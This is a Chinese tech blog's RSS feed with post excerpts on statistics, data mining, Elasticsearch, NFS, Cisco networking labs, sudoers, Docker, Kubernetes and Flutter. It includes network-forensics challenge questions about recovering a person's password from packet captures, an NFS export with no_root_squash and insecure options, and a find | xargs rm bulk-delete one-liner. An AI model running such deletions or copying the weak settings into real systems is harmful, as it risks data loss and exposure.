有時可以與 $w_i$ 權重相關。此反應他們所依附的對應值的意義、重要性或出現頻率。可以下計算： $$\bar{x} = \frac{\sum_{i=1}^{N} w_i x_i}{\sum_{i=1}^{N} w_i} = \frac{w_ix_1+w_2x_2+&amp;hellip;+w_nx_N}{w_1+w_2+&amp;hellip;+w_N}$$
這稱為加權是算術平均值（weight arithmetic mean）或加權平均值（weighted average）。
但上面計算的均值對極端值很敏感。要避免可以使用截尾均值(trimmed mean)，丟棄高低極端值得影響。在計算平均值之前，移除最底部 2% 資料等。
import numpy as np nums = [1,2,3,4,4,4,5,8,2,3] # Numpy np.mean(nums) # 3.6 # for sum = 0 for i in nums: sum += i print(sum/len(nums)) # 3.6 Median 樣本需要是排序 代表一個樣本或概率分佈中的一個數值，可將數值集合劃分為相等的上下兩部分 樣本為偶數個，則中位數不唯一，通常取最中間的兩個數值的平均值作為中位數 對於 偏斜（非對稱） 數據，數據中心更好度量是中位數(median)，將較高或較低值給平均。 有序數據值的中間值。</description></item><item><title>30 天學習歷程-day01</title><link>https://cch0124.github.io/blog/2020-08-17-know-data/</link><pubDate>Mon, 17 Aug 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2020-08-17-know-data/</guid><description>了解你的資料 在這兩年的碩士班中，我將利用 30 天將我學習到的知識進行分享。如果有錯誤歡迎指教。
有許多的資料都可以進行資料探勘，如：串流資料、時間序列資料、文字資料等。而透過資料探勘方式我們可以從該資料提取知識，也就是從資料中找到有意義的知識。在進行資料探勘時，資料的處裡也是相對重要，資料處裡過程有許多流程如下
Data Cleaning 刪除聲噪和刪除不一致數據 Data integration 多種數據源可以組合一起 Data Selection 從資料庫中提取與分析任務相關的數據 Data transformation 透過匯總或聚集操作，把數據變換和統一成適合挖掘形式 Data mining 使用智能方法提取數據模式 Pattern evaluation 數據某種興趣度度量，識別代表知識的真正有趣模式 Knowledge presentation 使用可視化和知識表示技術，向用戶提供挖掘知識 from &amp;ldquo;Data Mining. Concepts and Techniques, 3rd Edition&amp;rdquo;
第一天要講的主題是了解你的資料。當不了解資料，做探勘的意義就不大，其被找出來的知識將會讓人疑惑 ?
一個資料的集合是由許多資料實體組成，以網路流量來說，流量可能被儲存至資料庫或是 Hadoop 等數據儲存方案，當中的實體可能是一個 TCP 流量、網路流量等。再以儲存方式來看，一列為一個實體，一欄為一個屬性。
屬性 屬性簡單來說就是代表資料實體的特徵或變數等。一個資料實體的屬性集合，可稱它為特徵向量，該特徵向量描述了該實體。
接下來的介紹將會參考&amp;quot;Data Mining. Concepts and Techniques, 3rd Edition&amp;quot;。</description></item><item><title>wireshark analysis Ann AppleTV</title><link>https://cch0124.github.io/blog/2020-08-02-ann-appletv/</link><pubDate>Sun, 02 Aug 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2020-08-02-ann-appletv/</guid><description>題目 題目和內容，其中 Ann 的靜態 IP 是 192.168.1.10
What is the MAC address of Ann’s AppleTV? What User-Agent string did Ann’s AppleTV use in HTTP requests? What were Ann’s first four search terms on the AppleTV (all incremental searches count)? What was the title of the first movie Ann clicked on? What was the full URL to the movie trailer (defined by “preview-url”)? What was the title of the second movie Ann clicked on?</description></item><item><title>Elasticsearch 筆記</title><link>https://cch0124.github.io/blog/2020-06-12-es/</link><pubDate>Fri, 12 Jun 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2020-06-12-es/</guid><description>特點
分散式的即時文件儲存，每個字段都可被索引並可搜索 分散式即時分析搜索引擎 不規則查詢 高擴展，可處裡 PB 級結構或非結構化數據 Lucene 實現索引和搜索功能 透過簡單的 RESTful API 來隱藏 Lucene 的複雜性，讓搜索變簡單
ES 能做什麼 全文檢索 模糊查詢 數據分析 聚合等 Elasticsearch 的交互方式 基於 HTTP 協定，以 JSON 為數據交互格式的 RESTful API _cat $ curl &amp;#39;http://192.168.227.141:9200/_cat&amp;#39; ^.^ /_cat/allocation /_cat/shards /_cat/shards/{index} /_cat/master /_cat/nodes /_cat/tasks /_cat/indices /_cat/indices/{index} /_cat/segments /_cat/segments/{index} /_cat/count /_cat/count/{index} /_cat/recovery /_cat/recovery/{index} /_cat/health /_cat/pending_tasks /_cat/aliases /_cat/aliases/{alias} /_cat/thread_pool /_cat/thread_pool/{thread_pools} /_cat/plugins /_cat/fielddata /_cat/fielddata/{fields} /_cat/nodeattrs /_cat/repositories /_cat/snapshots/{repository} /_cat/templates $ curl &amp;#39;http://192.</description></item><item><title>wireshark analysis Ann Skips Bail</title><link>https://cch0124.github.io/blog/2020-05-18-ann-skips-bail-wireshark/</link><pubDate>Mon, 18 May 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2020-05-18-ann-skips-bail-wireshark/</guid><description>內容
題目 What is Ann’s email address? What is Ann’s email password? What is Ann’s secret lover’s email address? What two items did Ann tell her secret lover to bring? What is the NAME of the attachment Ann sent to her secret lover? What is the MD5sum of the attachment Ann sent to her secret lover? In what CITY and COUNTRY is their rendez-vous point? What is the MD5sum of the image embedded in the document?</description></item><item><title>wireshark analysis Ann’s Bad AIM</title><link>https://cch0124.github.io/blog/2020-05-17-ann-wireshark/</link><pubDate>Sun, 17 May 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2020-05-17-ann-wireshark/</guid><description>題目網站
Ann’s computer, (192.168.1.158) sent IMs over the wireless network to this computer. 這一句話可發現 Ann 的 IP 為 192.168.1.158，和使用的應用程式。
該應用程式為IM 協定，tcp port 為 5190
題目 What is the name of Ann’s IM buddy? What was the first comment in the captured IM conversation? What is the name of the file Ann transferred? What is the magic number of the file you want to extract (first four bytes)? What was the MD5sum of the file?</description></item><item><title>NFS</title><link>https://cch0124.github.io/project/2020-04-27-nfs/</link><pubDate>Mon, 27 Apr 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/project/2020-04-27-nfs/</guid><description>NFS 是經由 LAN 或 WAN 存取遠端檔案。它的共用是基於 Server 和 Client 關係。因此設定 NFS 時需要有網路位置和共享路徑。
Env 學校實驗室A系統 ubuntu 12.04 公網 學校實驗室B另一台主機 公網 Server Install sudo apt-get install nfs-kernel-server share dir setting // 學校實驗A室備份都放置 /home1/....../backup/NFS // share_dir client_ip(env setting) $ sudo vi /etc/exports share_dir 實驗室B_IP(rw,sync,no_root_squash,insecure,no_subtree_check) $ sudo chown nobody:nogroup share_dir $ sudo service nfs-kernel-server restart client_ip 就是實驗室B_IP，因為只限制該B實驗室存取，如果使用 * 則表示所有都可存取。
Option rw read and write operations sync write any change to the disc before applying it no_subtree_check: prevent subtree checking no_root_squash insecure Client Install sudo apt-get install nfs-common Mount directory of NFS $ sudo mount [nfs_server_ip]:[server_share_dir] [client_dir] 參考資料 mount 問題參考</description></item><item><title>csv combine</title><link>https://cch0124.github.io/blog/2020-02-13-csv-combine/</link><pubDate>Thu, 13 Feb 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2020-02-13-csv-combine/</guid><description>資料集有分為幾十種的種類，每一種類的資料大小都起碼 1G，由於深度學習時資料只有一個種類會不大理想，因此要將這些多個類型的檔案合併成一個。 我使用了 pandas，程式碼如下
import pandas as pd import os import glob csv_file_path = &amp;#39;DATA_ROOT_PATH&amp;#39; os.chdir(csv_file_path) list_of_file = [file for file in blob.glob(&amp;#39;DrDos_*.csv&amp;#39;)] combined_csv = pd.concat([pd.read_csv(f) for f in list_of_file[:-1]]) combined_csv.to_csv(&amp;#39;SAVE_PATH&amp;#39;, index=True) 個人配置是 32GB，但在處裡 2 個 4G 檔案做合併時就會發生記憶體不足的問體。問題點可能是
檔案真的太大 該檔案裡的資料型態佔據的記憶體空間。因為有時資料只有 0 或 1，卻用 int64 來儲存，那豈不是佔據空間 之後嘗試用，shell awk和管道來處理，該機器有 22G 記憶體空間，但在執行時，看不出記憶體變化程度，這優化不知道是怎麼回事&amp;hellip;。 之所以用 awk 是因為檔案中的 header 是一樣的，在合併時需要將該 header 省略，在配合著 &amp;gt;&amp;gt; 附加作用，即可完成。當然這種導向的輸出 cat、paste 等都可以做到，但因為沒省略 header 的方式，所以就沒用了。
awk &amp;#39;FNR &amp;gt; 1&amp;#39; file.csv file2.csv &amp;gt;&amp;gt; output.</description></item><item><title>router-on-a-stick</title><link>https://cch0124.github.io/blog/2020-01-05-router-on-a-stick/</link><pubDate>Sun, 05 Jan 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2020-01-05-router-on-a-stick/</guid><description>環境 這邊配置一台 L3 交換器、路由器、VM 和 PC。這一次實驗主要是實現單臂路由(router-on-a-stick)，單臂路由簡單來說是用來實現不同 VLAN 間的通訊，其接口需配置 trunk 協定，在藉由一個接口建立每個 VLAN 的網路 gateway。當 VLAN 有設置後，其每個封包都會帶著 VLAN 標籤，而這個標籤會在設定單臂路由的路由器進行解析，這樣就能讓不同 VLAN 可以相互通訊。至於 VLAN 相關操作和原理可查看之前寫的內容。
配置 ESW1 交換器與 R1 路由器 將接口啟動，並使用 hostname 配置 ESW1 的主機名稱。
ESW1#conf t ESW1(config)#hostname IT@L3 % Hostname contains one or more illegal characters. % Hostname &amp;#34;IT@L3&amp;#34; is not a legal LAT node name, Using &amp;#34;CISCO_18F100&amp;#34; IT@L3(config)#interface fastEthernet 1/0 IT@L3(config-if)#no shutdown IT@L3(config-if)#interface fastEthernet 1/15 IT@L3(config-if)#no shutdown IT@L3(config-if)#exit 配置 telnet 相關配置以及交換機上安全設定，有關 telnet 配置可參考之前文章所做的實驗。</description></item><item><title>ML-3-meanshift</title><link>https://cch0124.github.io/blog/2020-01-03-meanshift.md/</link><pubDate>Fri, 03 Jan 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2020-01-03-meanshift.md/</guid><description>What is meanshift 資料集的密度為一個隨核密度分佈，能夠在此資料集中找到局部極值，即為一個 kernel density estimation（它不需要預先知道樣本數據的概率密度分佈函數，完全能夠對樣本點的計算），因此將資料分群。
Example import numpy as np import matplotlib.pyplot as plt import pandas as pd from sklearn.cluster import MeanShift, estimate_bandwidth from sklearn import datasets from sklearn import preprocessing #create datasets # iris = datasets.load_iris() # X = iris.data[:, :4] url = &amp;#34;https://raw.githubusercontent.com/uiuc-cse/data-fa14/gh-pages/data/iris.csv&amp;#34; data = pd.read_csv(url) le = preprocessing.LabelEncoder() data[&amp;#39;species&amp;#39;] = le.fit_transform(data.iloc[:,-1]) X = data.iloc[:, 0:4].to_numpy() y = data.iloc[:,-1].to_numpy() plt.scatter(X[:, 0], X[:, 1], c=&amp;#34;yellow&amp;#34;, marker=&amp;#39;o&amp;#39;, label=&amp;#39;see&amp;#39;) plt.</description></item><item><title>ML-2-DBSCAN</title><link>https://cch0124.github.io/blog/2020-01-02-dbscan/</link><pubDate>Thu, 02 Jan 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2020-01-02-dbscan/</guid><description>What is DBSCAN DBSCAN（Density-based spatial clustering of applications with noise）是一種基於密度的演算法。給定一個數量點的閾值，表示該群集要超過一定的密度程度。密度程度則會透過距離方式來做計算。
Concept Parameters Eps 鄰域的最大半徑 MinPts 點的 Eps-neighborhood 中的最少點數量 Density Definition $\varepsilon$-Neighborhood 距離對象半徑 $\varepsilon$ 以內的對象。 距離 $\varepsilon$ 內的所有點的集合。 $N_{\varepsilon}(p):{q|d(p,q) \leq \varepsilon}$
High density 一個對象的 $\varepsilon$-Neighborhood 至少包含 MinPts 個對象。 ${\varepsilon}$-Neighborhood of $p$ ${\varepsilon}$-Neighborhood of $q$ Density of p is high (MinPts = 4) Density of q is low (MinPts = 4)</description></item><item><title>ML day1 k-means</title><link>https://cch0124.github.io/blog/2019-12-31-k-means/</link><pubDate>Tue, 31 Dec 2019 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2019-12-31-k-means/</guid><description>What is K-means 物以類聚的概念，K-means 的 K 就是幾群的意思。利用距離和群心的計算去完成聚類的任務。
K-means Algorithm 先設定 K 要分為幾群 輸入特徵 為 K 個群心計算 Euclidean distance 把每個資料分群至距離最短的該群心 重新計算各群的群心 不斷重複 3-5，直到收斂 Python sklearn example import pandas as pd import numpy as np import sklearn.metrics as sm import matplotlib.pyplot as plt from sklearn.cluster import KMeans from sklearn import datasets from sklearn import preprocessing url = &amp;#34;https://raw.githubusercontent.com/uiuc-cse/data-fa14/gh-pages/data/iris.csv&amp;#34; data = pd.read_csv(url) le = preprocessing.LabelEncoder() data[&amp;#39;species&amp;#39;] = le.fit_transform(data.iloc[:,-1]) X = data.iloc[:, 0:4].</description></item><item><title>supervised vs unsupervised Learning</title><link>https://cch0124.github.io/blog/2019-12-31-supervised-unsupervised/</link><pubDate>Tue, 31 Dec 2019 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2019-12-31-supervised-unsupervised/</guid><description>What is supervised ? 有存在正確答案的的數據，簡而言之就是有&amp;quot;Label&amp;quot;。監督式學習從有 Label 的數據學習建立出可預測的模型。例如：天氣狀況、物件辨識等。
流程：
Training Data -&amp;gt; Features Selection -&amp;gt; Algorithm -&amp;gt; Model Type Regression 預測一個數值 Classification 將輸出分組到一個類中 from : [http://www.slideshare.net/datascienceth/machine-learning-in-image-processing]
What is unsupervised ? 從無 Label 中的數據，自行找出資料的結構建立模型。相比監督式學習，無監督更加不可預測。
Type Clustering 從數據中找出結構或模式，並將其自然地作出聚類 Association 在大型的數據資料中找出數據對象之間的關聯 例子 購物的人瀏覽和購買物品的組合 from: [https://medium.com/data-science-by-heart/types-of-learning-93b721d5af91]</description></item><item><title>How exclude file ?</title><link>https://cch0124.github.io/blog/2019-12-12-rm-exclude-file/</link><pubDate>Thu, 12 Dec 2019 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2019-12-12-rm-exclude-file/</guid><description>使用方式 find . -type f | grep -v &amp;#34;.json&amp;#34; | xargs rm 透過 type 可指定檔案（f）或是目錄（d），在藉由 grep 的 -v 反向選取，之後再驅動 rm。如果想要多個條件的話要藉由 grep 配合規則表示。</description></item><item><title>淺談 sudoers</title><link>https://cch0124.github.io/blog/2019-11-17-sudoers/</link><pubDate>Sun, 17 Nov 2019 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2019-11-17-sudoers/</guid><description>描述 因為在學校要做資訊安全的報告，因此對帳號提權部分做了一點研究。本篇會對於 sudoers 和 sudo 的使用方式作介紹。主要探討的是為何在安裝 ubuntu 時，設定的使用者會有 sudo 提權的功能。
對於 sudo 的描述在先前文章有提過。
sudoers 配置檔的預設某些內容，格式為 使用者帳號 登入者的來源主機名稱=(可切換的身份) 可下達的指令。
... # User privilege specification root ALL=(ALL:ALL) ALL # Members of the admin group may gain root privileges %admin ALL=(ALL) ALL # Allow members of group sudo to execute any command %sudo ALL=(ALL:ALL) ALL ... 使用者帳號 可以使用 sudo 帳號名稱 或者以 % 為開頭表示已 GID 設定 登入者的來源主機名稱 限制使用者從特定網路主機連線，才能使用 sudo 指令 值 ALL 則代表不限制來源主機。 可切換的身份 值是填入帳號的 UID 取得這些帳號的權限 ALL 表示任何都可取得 可下達的指令 取得提權權限時可下的指令 ALL 表示執行的指令沒被限制 sudo usage $ sudo -u [UID] ls [FILE_PATH] # 取得該 UID 的權限，並執行指令 $ sudo -g [GID] ls [FILE_PATH] # 取德該 GID 的權限，並執行指令 Example cch 為安裝時，設定的使用者。test 則是新增的。</description></item><item><title>input csv to elasticsearch</title><link>https://cch0124.github.io/project/2019-11-15-elk-input-csv/</link><pubDate>Fri, 15 Nov 2019 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/project/2019-11-15-elk-input-csv/</guid><description>想法 實驗透過 logstash 傳遞 CSV 檔至 Elasticsearch。這邊 CSV 檔是來自於這邊的數據集，因為很懶得用 python 來分析資料，且該數據集太肥大，所以想藉由 ELK 了力量 XD。
目錄架構
$ tree . ├── docker-compose.yml ├── elasticsearch │ ├── config │ │ ├── elasticsearch-node2.yml │ │ ├── elasticsearch-node3.yml │ │ └── elasticsearch.yml │ └── Dockerfile ├── kibana │ ├── config │ │ ├── kibana.crt │ │ ├── kibana.key │ │ └── kibana.yml │ └── Dockerfile ├── logstash │ ├── config │ │ ├── logstash.yml │ │ └── pipelines.</description></item><item><title>VLAN 介紹</title><link>https://cch0124.github.io/blog/2019-11-10-vlan/</link><pubDate>Sun, 10 Nov 2019 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2019-11-10-vlan/</guid><description>VLAN(Virtual LAN) 是交換器上一個很重要的技術，它可以去規劃一個區域網路內的組織，也就是可將不同類型的部門網路進行邏輯上的網路切分。VLAN 的技術可將一台交換器上的埠分成幾個群，而每個群又可透過 VLAN 特性再做一些詳細設定，VLAN 邏輯上根據切分的群就有幾個廣播網域(Broadcast Domain)，所以這也讓不同的 VLAN 再域設下不能直接相互通訊。透過 VLAN 技術切分的廣播網域相比原本同一 LAN 下的廣播域對網路負擔要來的小。
VLAN 資料轉發 在多個交換器之間設定的 VLAN，則域設下只有同一 VLAN 才能通訊。在預設下交換器都屬於同一 VLAN 中，因此針對於接收到的封包對所有埠做 flooding 動作是對的，因此做了 VLAN 後，VLAN 間傳遞封包只會在該 VLAN 中進行 flooding。另外一個重點是 trunk，它用來對跨越多個交換器的 VLAN 進行轉發，要設置 trunk 則接口需要是 FastEthernet 以上才可設定。
trunk 資料轉發 trunk 會在封包內增加一個標籤，用來指名這封包是屬於哪個 VLAN，而這標邊被新增後將傳往下個設備。下個設備收到之後，再根據標籤來得知此封包是屬於哪個 VLAN，然後再轉發至所屬的 VLAN。
這邊將透過下面架構進行 VLAN 操作，這邊大致上會以 ESW1 做設定，ESW2 則是對應這邊不再多做說明與設置。
查看 ESW1 交換器 VLAN 訊息，發現所有接口預設都是 VLAN 1，在這種情況下我們的路由器 R1 至 R6 都能相互通訊。
ESW1#show vlan-switch VLAN Name Status Ports ---- -------------------------------- --------- ------------------------------- 1 default active Fa1/0, Fa1/1, Fa1/2, Fa1/3 Fa1/4, Fa1/5, Fa1/6, Fa1/7 Fa1/8, Fa1/9, Fa1/10, Fa1/11 Fa1/12, Fa1/13, Fa1/14, Fa1/15 1002 fddi-default active 1003 token-ring-default active 1004 fddinet-default active 1005 trnet-default active VLAN Type SAID MTU Parent RingNo BridgeNo Stp BrdgMode Trans1 Trans2 ---- ----- ---------- ----- ------ ------ -------- ---- -------- ------ ------ 1 enet 100001 1500 - - - - - 1002 1003 1002 fddi 101002 1500 - - - - - 1 1003 1003 tr 101003 1500 1005 0 - - srb 1 1002 1004 fdnet 101004 1500 - - 1 ibm - 0 0 1005 trnet 101005 1500 - - 1 ibm - 0 0 接著我們配置 VLAN 觀察，R1 和 R4 我們讓它預設；R2 和 R5 設至為 VLAN 20；R3 和 R6 為 VLAN 30。</description></item><item><title>navigation drawer</title><link>https://cch0124.github.io/blog/2019-11-08-listview-listtitle/</link><pubDate>Fri, 08 Nov 2019 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2019-11-08-listview-listtitle/</guid><description>目標 實現抽屜樣式的下拉式選單，或許 row 和 column 也能夠實現，但是會比較麻煩。這次實現步驟是透過 ListTile 和 ListView 實現。
ListTle 和 ListView ListTile 官方說 A single fixed-height row that typically contains some text as well as a leading or trailing icon. 是一個高度固定，但單一個列，通常包含一些文字和前導或尾隨的圖示。
原始碼
class ListTile extends StatelessWidget { /// Creates a list tile. /// /// If [isThreeLine] is true, then [subtitle] must not be null. /// /// Requires one of its ancestors to be a [Material] widget.</description></item><item><title>SSH</title><link>https://cch0124.github.io/blog/2019-11-15-cisco-ssh/</link><pubDate>Fri, 08 Nov 2019 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2019-11-15-cisco-ssh/</guid><description>拓樸 官網說明，啟用 SSH 需要四個步驟：
配置 hostname 配置 DNS domain 產生要使用的 SSH key vty 啟用 SSH transport 表明支援 SSH 與 telnet 比較之下，重點在於 SSH 有加密的機制，因此在傳遞資訊方面較為安全。
R1 設定 介面卡設定 R1#configure terminal Enter configuration commands, one per line. End with CNTL/Z. R1(config)#interface fastEthernet 0/0 R1(config-if)#ip address 192.168.6.200 255.255.255.0 R1(config-if)#no shutdown *Mar 1 00:03:03.563: %LINK-3-UPDOWN: Interface FastEthernet0/0, changed state to up *Mar 1 00:03:04.563: %LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet0/0, changed state to up SSH 設定 R1(config)#ip domain-name itachi.</description></item><item><title>cisco telnet</title><link>https://cch0124.github.io/blog/2019-11-06-cisco-telnet/</link><pubDate>Wed, 06 Nov 2019 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2019-11-06-cisco-telnet/</guid><description>拓樸 本實驗將 ubuntu16 與 VMware 的虛擬機做鏈接，因此 R1 和 ubuntu16 為同一個網段。本實驗練習設定以及用 wireshark 觀察 telnet。
遠端設備 原則上有以下方式可以連接設備
Console Terminal Remote Terminal Telnet SSH R1 設定 IP 配置 R1(config)#interface fastEthernet 0/0 R1(config-if)#ip address 192.168.6.200 255.255.255.0 R1(config-if)#no shutdown 啟用遠端 line vty 用來設定 0 到 4 的介面，藉由 login 設定登入時輸入帳號與密碼。要取消 telnet 使用 no login local 指令。
R1(config)#line vty 0 4 R1(config-line)#login R1(config-line)#exit R1(config)#username cisco7200 privilege 15 password cisco7200 R1(config)#exit R1#wr Building configuration... [OK] login 和 login local 在認證方面有些許差異。</description></item><item><title>full moon</title><link>https://cch0124.github.io/life/2019-10-17-full-moon/</link><pubDate>Thu, 17 Oct 2019 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/life/2019-10-17-full-moon/</guid><description>狩獵月 今年 10 月的滿月在 13 日，然而我在 10 月 15 日透過天文望遠鏡觀月，15 日那天觀看看起來還是滿月狀態。不過當天雲偏多，在觀看時有些微的被飄過的雲擋到一些光線。
傳統上，10 月滿月被稱為狩獵月，但民間傳說中也有別的名稱：&amp;ldquo;血月&amp;rdquo;、&amp;ldquo;旅行月&amp;rdquo;、&amp;ldquo;快活月&amp;quot;和&amp;quot;行將滅亡草的月&amp;rdquo;。 所以命名為狩獵月，是因為在每年的這個時候，秋天已經來臨，作物也已經收穫了，部落裡的人開始為狩獵做準備了。此時的月亮也非常明亮，允許獵人在夜間尋找獵物，所以稱為&amp;quot;獵人之月&amp;quot;。
by starwalk
攝影圖片 謝謝 S9+ 與 BK707AZ2 贊助。</description></item><item><title>Docker 基礎介紹</title><link>https://cch0124.github.io/blog/2019-10-05-docker-overview/</link><pubDate>Sat, 05 Oct 2019 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2019-10-05-docker-overview/</guid><description>Why do you need Docker 從先前的架構來看，建置一個網站需要有 Apache、MySQL、PHP 等。其中它們都依賴於當前的作業系統或著有些服務因為版本而依賴於不同的函式庫。因此這讓架構會變得有點凌亂導致新進的工程師必須去了解此凌亂的架構才能進行工作，而 Docker 技術能夠幾乎解決這樣的問題。
What can I do 從下圖看出，在作業系統上裝一個 Docker，並透過 docker run 去建置容器。Docker 能夠將每個運行服務的每一個組件，丟至該服務容器（container）中，讓每個服務依賴於該容器中被定義的 image。
by docker.com
那這又跟 VM 又有麼差異呢 ? 在資源使用率上會有差異。
What is container 一種隔離環境的技術， 可以擁有自己的 process、network、mount，但是容器會共用 kernel。在又 Docker 此技術之前，容器的概念先前就有，像是 lkx、chroot 等。但整合方面的完整性都歸功於 Docker。 container 應該要說是一種概念，Docker 是一個實作 container 的技術。container 竟然是一種概念，它必定有規範，稱作 Open Container Initiative (OCI)。藉由此標準可以提升 container 不同解決方案的相容性。 然而，Open Container Initiative (OCI) 定義兩大的標準
Runtime Specification Image Specification 對於 Docker 來說，image 相關的操作 images/pull/push 等甚至是藉由 Dockerfile 來建立自己的工作環境，這些都牽扯到了 image。Image Specification 就是來規範 Image。 相對的 Runtime Specification 是控制 container 的生命週期 create/delete/start/stop 或是運行 container 時透過 exec/attach 與 container 的互動。對於 container 中，隔離會使用 namespace 來完成，namespace 操作會有 pid、network、ipc、mount 等。</description></item><item><title>底部滑動按鈕</title><link>https://cch0124.github.io/blog/2019-09-23-flutter-bottom/</link><pubDate>Mon, 23 Sep 2019 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2019-09-23-flutter-bottom/</guid><description>想法 使用 button 用 row 集成 button 為同一列 SingleChildScrollView 滑動 EdgeInsets 設定 button 之間距離 用 container 包住元件 程式碼 import &amp;#39;package:flutter/material.dart&amp;#39;; import &amp;#39;package:flutter/painting.dart&amp;#39;; import &amp;#39;package:flutter/widgets.dart&amp;#39;; /** * 定義資料結構，button 要有名稱和動作 */ class BottomButtonModel { String title; String routeName; BottomButtonModel(String title, String routeName) { this.title = title; this.routeName = routeName; } } List&amp;lt;BottomButtonModel&amp;gt; bottomButtonItems = [ BottomButtonModel(&amp;#34;F1&amp;#34;, &amp;#34;F1&amp;#34;), BottomButtonModel(&amp;#34;F2&amp;#34;, &amp;#34;F2&amp;#34;), BottomButtonModel(&amp;#34;F3&amp;#34;, &amp;#34;F3&amp;#34;), BottomButtonModel(&amp;#34;F4&amp;#34;, &amp;#34;F4&amp;#34;), BottomButtonModel(&amp;#34;F5&amp;#34;, &amp;#34;F5&amp;#34;), BottomButtonModel(&amp;#34;F6&amp;#34;, &amp;#34;F6&amp;#34;), BottomButtonModel(&amp;#34;F7&amp;#34;, &amp;#34;F7&amp;#34;), BottomButtonModel(&amp;#34;F8&amp;#34;, &amp;#34;F8&amp;#34;), BottomButtonModel(&amp;#34;F9&amp;#34;, &amp;#34;F9&amp;#34;), BottomButtonModel(&amp;#34;F0&amp;#34;, &amp;#34;F0&amp;#34;), BottomButtonModel(&amp;#34;F.</description></item><item><title>kubernetes</title><link>https://cch0124.github.io/kubernetes/2019-09-20-kubernetes/</link><pubDate>Fri, 20 Sep 2019 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/kubernetes/2019-09-20-kubernetes/</guid><description>Introduction k8s 是一個用來編排容器的工具，這近幾年非常火紅。有著高可靠的架構、應用程序部署、自動部署、擴展等功能。
本篇文章已安裝為目的。
Kubernetes Cluster Components Node 被 Master 管理的節點可以是實體機或虛擬機 每個 Node 上執行 Pod 服務，並進行管理和啟動透過 kubelet Pod kubernetes 中運行的最小單位，可以是一個或多個容器 透過 Node 新增、刪除、啟動 生命週期存在 4 種狀態（Pending、Running、Succeeded、Failed） 具有共享 volumn，提供對 Pod 中所有容器的存取 Selector 透過比對物件針對任何標籤進行的查詢 Replication Controller 定義 Pod 數量 在 master 上，Controller Manager 透過 RC 的定義完成 Pod 建立、監控、啟動、停止等操作 任何 Pod 發生故障，它會讓群集狀態恢復正常 Label 定義物件的可辨識屬性，用它們進行管理和選擇 key-value 定義 Service 用來提供 Pod 對外存取的介面 NodePort LoadBlance Ingress by yeasy.</description></item><item><title>資料表實現</title><link>https://cch0124.github.io/blog/2019-09-28-flutter-data-table/</link><pubDate>Fri, 20 Sep 2019 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2019-09-28-flutter-data-table/</guid><description>目標 頁面顯示資料表使用 DataTable 配合 scroll 使資料表能夠上下左右滑動 以下會先以描述 DataTable Widget 在描述實作過程。
what is DataTable DataTable 可實現數據的操作（排序、選擇等）和顯示。但這篇文章只有說明到顯示部分。但此 DataTable 並無做到表頭的固定，覺得可惜。少了表頭固定當滑動資料表時會無法對應該欄位是在針對什麼描述。
要組成一個 DataTable 可需要 DataColumn、DataRow 和 DataCell 組件做配置。
而在 DataTable 原始碼 中，可以知道他可以針對表頭高度、欄位間格等做設定。在原始碼中已給預設值，但可依照環境要求進行設定。
DataTable({ Key key, @required this.columns, this.sortColumnIndex, this.sortAscending = true, this.onSelectAll, this.dataRowHeight = kMinInteractiveDimension, this.headingRowHeight = 56.0, this.horizontalMargin = 24.0, this.columnSpacing = 56.0, @required this.rows, }) : assert(columns != null), assert(columns.isNotEmpty), assert(sortColumnIndex == null || (sortColumnIndex &amp;gt;= 0 &amp;amp;&amp;amp; sortColumnIndex &amp;lt; columns.</description></item><item><title>at 和 crontab 使用</title><link>https://cch0124.github.io/blog/2019-09-01-schedule/</link><pubDate>Sun, 01 Sep 2019 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2019-09-01-schedule/</guid><description>工作排程 at 單次工作排程 crontab 循環定期排程 常見工作可能有，備份、自動更新、網路一些工具等。
單次工作排程 at 參數 說明 -m 完成後寄信 -l 列出系統上所有排程 -d 取消一個工作 -c 列出後面工作實際指令 example $ at now +1 minutes warning: commands will be executed using /bin/sh at&amp;gt; echo &amp;#34;Test&amp;#34; &amp;gt; ../cch/text.at at&amp;gt; &amp;lt;EOT&amp;gt; job 3 at Sun Sep 1 09:17:00 2019 $ atq # 查排程 3 Sun Sep 1 09:17:00 2019 a cch 循環定期排程 crontab |參數|說明| |-e|編輯所有使用帳號的 crontab| |-l|編輯所有使用帳號的排程列表|</description></item><item><title>flutter Button route 應用</title><link>https://cch0124.github.io/blog/2019-08-12-flutter-button-route/</link><pubDate>Sun, 01 Sep 2019 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2019-08-12-flutter-button-route/</guid><description>目標 在手機底部做一個能夠左右滑動的多個按鈕集合。希望按下第一個按鈕能切換至他的頁面；第二個按鈕能切換至他的頁面以此類推
flutter 路由方式 Route route 是應用程式的螢幕或頁面的抽象，Navigator 是管理 route 的 widget Navigator 建立維護由 stack 的歷史記錄的 Widget。Navigator 可以 push 和 pop 出 route，幫助使用者從一個螢幕畫面移動到另一個屏幕畫面 Material Page Route 一種樣式 route，用 platform-adaptive transition 替換整個螢幕畫面 什麼是 platform-adaptive transition？ 從一個螢幕畫面路由到其他螢幕換面時看到的轉換。
